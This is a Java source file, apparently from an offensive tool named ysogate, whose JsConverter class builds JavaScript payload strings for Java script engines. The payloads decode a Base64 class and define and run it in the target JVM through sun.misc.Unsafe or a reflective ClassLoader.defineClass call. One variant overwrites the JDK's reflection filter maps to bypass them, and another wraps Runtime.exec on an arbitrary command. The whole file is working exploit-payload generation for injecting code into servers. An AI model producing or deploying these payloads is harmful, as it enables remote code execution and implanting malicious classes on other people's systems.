package com.h2tg.ysogate.bullet.defineClass;

import org.apache.commons.lang.StringEscapeUtils;

import java.util.Base64;

//适用范围：jdk6-14
public class JsConverter
{
    public static String all(String baseCode)
    {
        String js = "function Base64DecodeToByte(str) {" +
                "    var bt;" +
                "    try {" +
                "        bt = java.lang.Class.forName('sun.misc.BASE64Decoder').newInstance().decodeBuffer(str);" +
                "    } catch (e) {" +
                "        bt = java.util.Base64.getDecoder().decode(str);" +
                "    }" +
                "    return bt;" +
                "}" +
                "" +
                "function defineClass(classBytes) {" +
                "    var theUnsafe = java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');" +
                "    theUnsafe.setAccessible(true);" +
                "    unsafe = theUnsafe.get(null);" +
                "    unsafe.defineAnonymousClass(java.lang.Class.forName('java.lang.Class'), classBytes, null).newInstance();" +
                "}" +
                "" +
                "defineClass(Base64DecodeToByte('" + baseCode + "'));";
        return StringEscapeUtils.escapeJava(js);
    }

    public static String defineAnonymous(String baseCode)
    {
        String js = "function Base64DecodeToByte(str) {" +
                "    var bt;" +
                "    try {" +
                "        bt = java.lang.Class.forName('sun.misc.BASE64Decoder').newInstance().decodeBuffer(str);" +
                "    } catch (e) {" +
                "        bt = java.util.Base64.getDecoder().decode(str);" +
                "    }" +
                "    return bt;" +
                "}" +
                "" +
                "function defineClass(classBytes) {" +
                "    var theUnsafe = java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');" +
                "    theUnsafe.setAccessible(true);" +
                "    unsafe = theUnsafe.get(null);" +
                "    unsafe.defineAnonymousClass(java.lang.Class.forName('java.lang.Class'), classBytes, null).newInstance();" +
                "}" +
                "" +
                "defineClass(Base64DecodeToByte('" + baseCode + "'));";
        return StringEscapeUtils.escapeJava(js);
    }

    public static String goby(String baseCode)
    {
        String js = "try {" +
                "    load('nashorn:mozilla_compat.js');" +
                "} catch (e) {" +
                "}" +
                "" +
                "function getUnsafe() {" +
                "    var theUnsafeMethod =" +
                "        java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');" +
                "    theUnsafeMethod.setAccessible(true);" +
                "    return theUnsafeMethod.get(null);" +
                "}" +
                "" +
                "function removeClassCache(clazz) {" +
                "    var unsafe = getUnsafe();" +
                "    var clazzAnonymousClass = unsafe.defineAnonymousClass(" +
                "        clazz," +
                "        java.lang.Class.forName('java.lang.Class')" +
                "            .getResourceAsStream('Class.class')" +
                "            .readAllBytes()," +
                "        null" +
                "    );" +
                "    var reflectionDataField =" +
                "        clazzAnonymousClass.getDeclaredField('reflectionData');" +
                "    unsafe.putObject(clazz, unsafe.objectFieldOffset(reflectionDataField), null);" +
                "}" +
                "" +
                "function bypassReflectionFilter() {" +
                "    var reflectionClass;" +
                "    try {" +
                "        reflectionClass = java.lang.Class.forName(" +
                "            'jdk.internal.reflect.Reflection'" +
                "        );" +
                "    } catch (error) {" +
                "        reflectionClass = java.lang.Class.forName('sun.reflect.Reflection');" +
                "    }" +
                "    var unsafe = getUnsafe();" +
                "    var classBuffer = reflectionClass" +
                "        .getResourceAsStream('Reflection.class')" +
                "        .readAllBytes();" +
                "    var reflectionAnonymousClass = unsafe.defineAnonymousClass(" +
                "        reflectionClass," +
                "        classBuffer," +
                "        null" +
                "    );" +
                "    var fieldFilterMapField =" +
                "        reflectionAnonymousClass.getDeclaredField('fieldFilterMap');" +
                "    var methodFilterMapField =" +
                "        reflectionAnonymousClass.getDeclaredField('methodFilterMap');" +
                "    if (" +
                "        fieldFilterMapField" +
                "            .getType()" +
                "            .isAssignableFrom(java.lang.Class.forName('java.util.HashMap'))" +
                "    ) {" +
                "        unsafe.putObject(" +
                "            reflectionClass," +
                "            unsafe.staticFieldOffset(fieldFilterMapField)," +
                "            java.lang.Class.forName('java.util.HashMap')" +
                "                .getConstructor()" +
                "                .newInstance()" +
                "        );" +
                "    }" +
                "    if (" +
                "        methodFilterMapField" +
                "            .getType()" +
                "            .isAssignableFrom(java.lang.Class.forName('java.util.HashMap'))" +
                "    ) {" +
                "        unsafe.putObject(" +
                "            reflectionClass," +
                "            unsafe.staticFieldOffset(methodFilterMapField)," +
                "            java.lang.Class.forName('java.util.HashMap')" +
                "                .getConstructor()" +
                "                .newInstance()" +
                "        );" +
                "    }" +
                "    removeClassCache(java.lang.Class.forName('java.lang.Class'));" +
                "}" +
                "" +
                "function setAccessible(accessibleObject) {" +
                "    var unsafe = getUnsafe();" +
                "    var overrideField = java.lang.Class.forName(" +
                "        'java.lang.reflect.AccessibleObject'" +
                "    ).getDeclaredField('override');" +
                "    var offset = unsafe.objectFieldOffset(overrideField);" +
                "    unsafe.putBoolean(accessibleObject, offset, true);" +
                "}" +
                "" +
                "function defineClass(bytes) {" +
                "    var clz = null;" +
                "    var version = java.lang.System.getProperty('java.version');" +
                "    var unsafe = getUnsafe();" +
                "    var classLoader = new java.net.URLClassLoader(" +
                "        java.lang.reflect.Array.newInstance(" +
                "            java.lang.Class.forName('java.net.URL')," +
                "            0" +
                "        )" +
                "    );" +
                "    try {" +
                "        if (version.split('.')[0] >= 11) {" +
                "            bypassReflectionFilter();" +
                "            defineClassMethod = java.lang.Class.forName(" +
                "                'java.lang.ClassLoader'" +
                "            ).getDeclaredMethod(" +
                "                'defineClass'," +
                "                java.lang.Class.forName('[B')," +
                "                java.lang.Integer.TYPE," +
                "                java.lang.Integer.TYPE" +
                "            );" +
                "            setAccessible(defineClassMethod);" +
                "            clz = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);" +
                "        } else {" +
                "            var protectionDomain = new java.security.ProtectionDomain(" +
                "                new java.security.CodeSource(" +
                "                    null," +
                "                    java.lang.reflect.Array.newInstance(" +
                "                        java.lang.Class.forName('java.security.cert.Certificate')," +
                "                        0" +
                "                    )" +
                "                )," +
                "                null," +
                "                classLoader," +
                "                []" +
                "            );" +
                "            clz = unsafe.defineClass(" +
                "                null," +
                "                bytes," +
                "                0," +
                "                bytes.length," +
                "                classLoader," +
                "                protectionDomain" +
                "            );" +
                "        }" +
                "    } catch (error) {" +
                "        error.printStackTrace();" +
                "    } finally {" +
                "        return clz;" +
                "    }" +
                "}" +
                "" +
                "function base64DecodeToByte(str) {" +
                "    var bt;" +
                "    try {" +
                "        bt = java.lang.Class.forName('sun.misc.BASE64Decoder').newInstance().decodeBuffer(str);" +
                "    } catch (e) {" +
                "        bt = java.lang.Class.forName('java.util.Base64').newInstance().getDecoder().decode(str);" +
                "    }" +
                "    return bt;" +
                "}" +
                "clz = defineClass(base64DecodeToByte('" + baseCode + "'));" +
                "clz.newInstance();";
        return StringEscapeUtils.escapeJava(js);
    }

    public static String loadByJS(String baseCode)
    {
        String js = "var bytes = java.util.Base64.getDecoder().decode('" + baseCode + "');" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                "var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                "method.setAccessible(true);" +
                "var clazz = method.invoke(classLoader, bytes, 0, bytes.length);" +
                "clazz.newInstance();";
        return StringEscapeUtils.escapeJava(js);
    }

    public static String loadByJS2(String baseCode)
    {
        String js = "var s = '" + baseCode + "';" +
                "var bt;" +
                "try {" +
                "bt = java.lang.Class.forName('sun.misc.BASE64Decoder').newInstance().decodeBuffer(s);" +
                "} catch (e) {" +
                "bt = java.util.Base64.getDecoder().decode(s);" +
                "}" +
                "var theUnsafeField = java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');" +
                "theUnsafeField.setAccessible(true);" +
                "unsafe = theUnsafeField.get(null);" +
                "unsafe.defineAnonymousClass(java.lang.Class.forName('java.lang.Class'), bt, null).newInstance();";
        return StringEscapeUtils.escapeJava(js);
    }

    public static String js2cmd(String cmd)
    {
        String js = "java.lang.Runtime.getRuntime().exec('" + cmd + "')";
        return StringEscapeUtils.escapeJava(js);
    }
}
